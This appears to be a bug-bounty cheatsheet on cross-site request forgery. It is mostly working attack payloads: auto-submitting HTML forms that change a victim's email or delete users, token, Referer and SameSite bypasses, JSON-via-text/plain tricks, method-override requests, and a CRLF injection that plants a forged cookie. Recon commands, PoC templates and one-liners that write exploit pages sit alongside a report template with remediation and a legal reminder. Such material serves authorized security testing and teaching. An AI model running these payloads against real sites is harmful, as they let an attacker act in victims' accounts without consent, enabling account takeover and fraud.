

# 🎯 CSRF MASTER CHEATSHEET

---

## 📍 PART 1: WHERE TO FIND CSRF?

> [!TIP] High-Value Endpoints (Always Test These)
```
✅ Account Changes:
• /change-email, /update-email, /set-email
• /change-password, /reset-password
• /update-profile, /edit-account, /save-settings

✅ Financial:
• /transfer, /withdraw, /deposit, /payment, /checkout
• /add-card, /update-card, /delete-card

✅ OAuth/Social:
• /link-account, /unlink-account, /connect, /oauth/*

✅ Admin:
• /admin/*, /delete-user, /ban-user, /change-role

✅ Media:
• /upload-avatar, /update-photo, /change-picture
```

> [!EXAMPLE] How to Find These Endpoints
```bash
# 1. Manual browsing + Burp Proxy
# Watch every request when clicking buttons

# 2. Search JS files for API calls:
grep -r "fetch\|axios\|ajax" /static/js/

# 3. Use recon tools:
gau target.com | grep -i "change\|update\|delete"
waybackurls target.com | gf api
katana -u target.com -d 3 -o endpoints.txt

# 4. Check sitemap/robots.txt:
curl https://target.com/sitemap.xml
curl https://target.com/robots.txt
```

---

## 🔬 PART 2: TESTING METHODOLOGY

> [!CHECKLIST] Quick Test Flow
```markdown
- [ ] Is the request changing data? (not read-only)
- [ ] Does it use cookies for auth? (not Bearer token)
- [ ] Is there a CSRF token? → Test bypasses
- [ ] Does it check Referer/Origin? → Test bypasses
- [ ] Does it use SameSite cookies? → Test bypasses
- [ ] Is the body JSON? → Test Content-Type bypasses
```

> [!STEP-BY-STEP] Detection Process
```
1️⃣ Login → Do action → Capture request in Burp

2️⃣ Check for CSRF token:
   • Look for: csrf_token, authenticity_token, _token
   • NO token? → ⚠️ Possible vuln → Build PoC
   • YES token? → Test bypasses:
     □ Delete parameter completely
     □ Leave empty: csrf_token=
     □ Use token from another account
     □ Use old/expired token
     □ Change 1 char in token

3️⃣ Check Referer/Origin:
   □ Delete Referer header
   □ Add: <meta name="referrer" content="no-referrer">
   □ Try spoofed: victim.com.evil.com

4️⃣ Check SameSite:
   □ Lax? → Try POST→GET + window.location
   □ Strict? → Look for Open Redirect/Path Traversal

5️⃣ Check JSON body:
   □ Change Content-Type: application/json → text/plain
   □ Try: application/x-www-form-urlencoded

6️⃣ Check method:
   □ Try POST→GET
   □ Try: ?_method=POST
   □ Try header: X-HTTP-Method-Override: PUT
```

---

## 💥 PART 3: ALL BYPASS TECHNIQUES

### 🔐 CSRF Token Bypass

> [!CODE] Delete Token Parameter
```html
<form method="POST" action="https://target.com/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
  <!-- NO csrf_token field at all -->
</form>
<script>document.forms[0].submit();</script>
```

> [!CODE] Empty Token Value
```html
<form method="POST" action="https://target.com/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf_token" value="">  <!-- Empty! -->
</form>
<script>document.forms[0].submit();</script>
```

> [!CODE] Token Reuse (Not Session-Bound)
```html
<!-- Get token from YOUR account, use for victim -->
<form method="POST" action="https://target.com/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf_token" value="TOKEN_FROM_YOUR_ACCOUNT">
</form>
<script>document.forms[0].submit();</script>
```

---

### 🌐 Referer/Origin Bypass

> [!CODE] Remove Referer Header
```html
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body>
  <form method="POST" action="https://target.com/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
</body>
```

> [!CODE] Spoof Referer with pushState
```html
<head>
  <meta name="referrer" content="unsafe-url">
</head>
<script>
  history.pushState("", "", "?target.com");  // Makes browser send full URL
</script>
<form method="POST" action="https://target.com/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

> [!TIP] Domain Spoofing Tricks
```
Try these in Referer:
• https://target.com.evil.com
• https://evil.com#target.com
• https://evil.com?target.com
• https://attacker@target.com
• https://evil.com/file@target.com
```

---

### 🍪 SameSite Cookie Bypass

> [!CODE] SameSite=Lax + GET Request
```html
<!-- Lax allows cookies with GET + top-level navigation -->
<script>
  window.location = "https://target.com/change-email?email=attacker@evil.com";
</script>
```

> [!CODE] SameSite=Strict + Open Redirect
```html
<!-- Find redirect endpoint in same domain -->
<script>
  window.location = "https://target.com/redirect?url=/change-email?email=attacker@evil.com";
</script>
```

> [!CODE] SameSite=Strict + Path Traversal
```html
<script>
  // Use path traversal to reach sensitive endpoint
  window.location = "https://target.com/post?postId=../../../change-email?email=attacker@evil.com";
</script>
```

> [!CODE] SameSite=Strict + Sibling Domain XSS
```html
<!-- If cms.target.com has XSS and is same-site -->
<script>
  document.location = "https://cms.target.com/login?username=" + 
    encodeURIComponent("<script>/* CSRF code */</script>");
</script>
```

---

### 📦 JSON Body Bypass

> [!CODE] Method 1: text/plain + Form Trick
```html
<form method="POST" action="https://target.com/api/update" enctype="text/plain">
  <!-- Creates: {"email":"attacker@evil.com","x":"="} -->
  <input type="hidden" name='{"email":"attacker@evil.com","x":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

> [!CODE] Method 2: Nested JSON
```html
<form method="POST" action="https://target.com/api/update" enctype="text/plain">
  <input type="hidden" name='{"user":{"email":"' value='attacker@evil.com"'>
  <input type="hidden" name=', "meta":{"x":"' value='"}}'>
</form>
<script>document.forms[0].submit();</script>
```

> [!CODE] Method 3: Fetch + CORS Misconfiguration
```html
<script>
  fetch("https://target.com/api/update", {
    method: "POST",
    credentials: "include",  // Send cookies!
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: "attacker@evil.com" })
  });
</script>
```

> [!CODE] Method 4: Content-Type Confusion
```html
<!-- Send JSON as form-encoded -->
<form method="POST" action="https://target.com/api/update">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

---

### 🔄 Method Override Bypass

> [!CODE] POST → GET
```html
<!-- If endpoint accepts GET -->
<script>
  window.location = "https://target.com/change-email?email=attacker@evil.com";
</script>
```

> [!CODE] _method Parameter
```html
<!-- If server supports method spoofing -->
<form method="POST" action="https://target.com/api/delete-user?_method=DELETE">
  <input type="hidden" name="user_id" value="victim">
</form>
<script>document.forms[0].submit();</script>
```

> [!CODE] Header Override
```javascript
// If server checks X-HTTP-Method-Override
fetch("https://target.com/api/delete-user", {
  method: "POST",
  headers: { "X-HTTP-Method-Override": "DELETE" },
  credentials: "include",
  body: "user_id=victim"
});
```

---

### 🍪 Cookie-Based Token Bypass

> [!CODE] Double Submit + CRLF Injection
```html
<!-- Inject fake csrf cookie via vulnerable search -->
<img src="https://target.com/search?q=x%0d%0aSet-Cookie:%20csrf=FAKE%3b%20SameSite=None" 
     onerror="document.forms[0].submit()" style="display:none"/>

<form method="POST" action="https://target.com/change-email">
  <input type="hidden" name="csrf" value="FAKE">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

> [!CODE] Cookie Refresh Endpoint
```html
<!-- If /refresh-session updates cookie via GET -->
<img src="https://target.com/refresh-session" onerror="executeCSRF()" style="display:none"/>
<script>
  function executeCSRF() {
    setTimeout(() => {
      window.location = "https://target.com/change-email?email=attacker@evil.com";
    }, 500);
  }
</script>
```

---

## 🧰 PART 4: PoC TEMPLATES 

> [!CODE] Basic POST Form
```html
<!DOCTYPE html>
<html>
<body>
  <form id="csrf" method="POST" action="https://TARGET/ENDPOINT">
    <input type="hidden" name="FIELD" value="VALUE">
  </form>
  <script>
    history.pushState("", "", "/");
    document.getElementById("csrf").submit();
  </script>
</body>
</html>
```

> [!CODE] GET Request
```html
<!DOCTYPE html>
<html>
<body>
  <script>
    window.location = "https://TARGET/ENDPOINT?param=value";
  </script>
</body>
</html>
```

> [!CODE] JSON via text/plain
```html
<!DOCTYPE html>
<html>
<body>
  <form method="POST" action="https://TARGET/ENDPOINT" enctype="text/plain">
    <input type="hidden" name='{"FIELD":"' value='VALUE"}'>
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

> [!CODE] With Referer Bypass
```html
<!DOCTYPE html>
<html>
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body>
  <form id="csrf" method="POST" action="https://TARGET/ENDPOINT">
    <input type="hidden" name="FIELD" value="VALUE">
  </form>
  <script>
    history.pushState("", "", "/");
    document.getElementById("csrf").submit();
  </script>
</body>
</html>
```

> [!CODE] Auto-submit with Delay
```html
<!DOCTYPE html>
<html>
<body>
  <form id="csrf" method="POST" action="https://TARGET/ENDPOINT">
    <input type="hidden" name="FIELD" value="VALUE">
  </form>
  <script>
    setTimeout(() => {
      document.getElementById("csrf").submit();
    }, 1000);
  </script>
</body>
</html>
```

---

## 📝 PART 5: REPORT TEMPLATE

> [!CODE] Markdown Report Template
```markdown
## Title
CSRF in [ENDPOINT] allows [IMPACT]

## Summary
A Cross-Site Request Forgery vulnerability exists in [endpoint], 
allowing an attacker to [action] on behalf of authenticated users.

## Steps to Reproduce
1. Login as user on https://target.com
2. Capture [action] request in Burp Suite
3. [Describe bypass: e.g., "Remove csrf_token parameter"]
4. Replay request → observe 200 OK + action executed
5. Test PoC in fresh browser → action executes successfully

## Proof of Concept
```html
[Your PoC code here]
```
[Attach screenshot showing successful execution]

## Impact
• Attacker can [specific impact] without user consent
• Affects [number] authenticated users
• Can lead to [account takeover / financial loss / data leak]

## Remediation
✅ Implement unique, session-bound CSRF tokens
✅ Validate Origin/Referer headers with fail-closed logic  
✅ Set SameSite=Strict for session cookies
✅ Require re-authentication for sensitive actions
✅ For APIs: Use Bearer tokens in headers instead of cookies

## References
• OWASP CSRF Cheat Sheet
• [My CSRF Cheat Sheet](file:///E:/Bug%20Bounty/5-Client-Side/5.CSRF/csrf_cheatsheet.html)

## 🧭 PART 7: QUICK DECISION TREE

> [!GRAPH] Decision Flow
```
Found state-changing endpoint?
│
├─► No CSRF token? → Build basic PoC → Test → Report! 🎉
│
├─► Has CSRF token?
│   ├─► Delete token → Works? → Report! 🎉
│   ├─► Empty token → Works? → Report! 🎉
│   ├─► Use token from another account → Works? → Report! 🎉
│   └─► All fail? → Check other protections ↓
│
├─► Checks Referer/Origin?
│   ├─► Remove header → Works? → Report! 🎉
│   ├─► Spoof domain → Works? → Report! 🎉
│   └─► All fail? → Check SameSite ↓
│
├─► Uses SameSite cookies?
│   ├─► SameSite=Lax → Try GET + window.location → Works? → Report! 🎉
│   ├─► SameSite=Strict → Look for Open Redirect/Path Traversal → Works? → Report! 🎉
│   └─► All fail? → Check JSON ↓
│
├─► Body is JSON?
│   ├─► Change Content-Type to text/plain → Works? → Report! 🎉
│   ├─► Try form-encoded → Works? → Report! 🎉
│   ├─► Check CORS misconfig → Works? → Report! 🎉
│   └─► All fail? → Look for XSS to steal token ↓
│
└─► Still protected? → Try:
    • Clickjacking if button not protected
    • CRLF injection to set cookies
    • Chain with other bugs (XSS, IDOR, etc.)```
```
## 💡 PRO TIPS

> [!TIP] From Experience
```
🔹 Always test with FRESH browser session — cached cookies hide bugs

🔹 Use Burp's "Generate CSRF PoC" — auto-handles edge cases

🔹 If PoC works on YOU but not victim → Check:
   • Session timeout (refresh token first)
   • Popup blockers (add user interaction)
   • Timing issues (add setTimeout delays)

🔹 For JSON endpoints → Try text/plain FIRST — works 80% of time

🔹 When in doubt → Test ALL bypasses — one will work

🔹 Document EVERY test — even failed ones help triagers

🔹 Impact is KEY — always explain business context
```

---

## 🚀 FINAL CHECKLIST

> [!CHECKLIST] Before Submitting
```markdown
- [ ] PoC works in fresh browser session (not your logged-in session)
- [ ] PoC doesn't require user interaction (or clearly states if it does)
- [ ] Impact is clearly explained with business context
- [ ] Steps to reproduce are detailed and repeatable
- [ ] Remediation suggestions are practical and specific
- [ ] No sensitive data exposed in PoC (use test accounts)
- [ ] Tested on multiple browsers if possible (Chrome, Firefox)
- [ ] Included screenshots/videos showing successful exploitation
```

---

> [!WARNING] Legal Reminder
> Only test on programs you're authorized for. Unauthorized testing is illegal.

---

## 🎁 BONUS: One-Liner PoC Generator

> [!CODE] Bash Commands
```bash
# Quick PoC for basic CSRF:
echo '<form method=POST action=https://TARGET/ENDPOINT><input name=FIELD value=VALUE><script>document.forms[0].submit()</script>' > poc.html

# For JSON via text/plain:
echo '<form method=POST action=https://TARGET/ENDPOINT enctype=text/plain><input name="{\"FIELD\":\"VALUE\",\"x\":\"" value=\"}\"><script>document.forms[0].submit()</script>' > poc.html

# Open in browser:
open poc.html  # macOS
start poc.html  # Windows
xdg-open poc.html  # Linux
```

---

> [!SUMMARY] Key Takeaways
> 1. Always test state-changing endpoints first
> 2. Try `text/plain` for JSON bypasses — works 80% of time
> 3. Delete CSRF token parameter completely (not just empty)
> 4. Use `window.location` for SameSite=Lax bypass
> 5. Look for Open Redirect/Path Traversal for SameSite=Strict
> 6. Document everything — triagers love clear reports

---
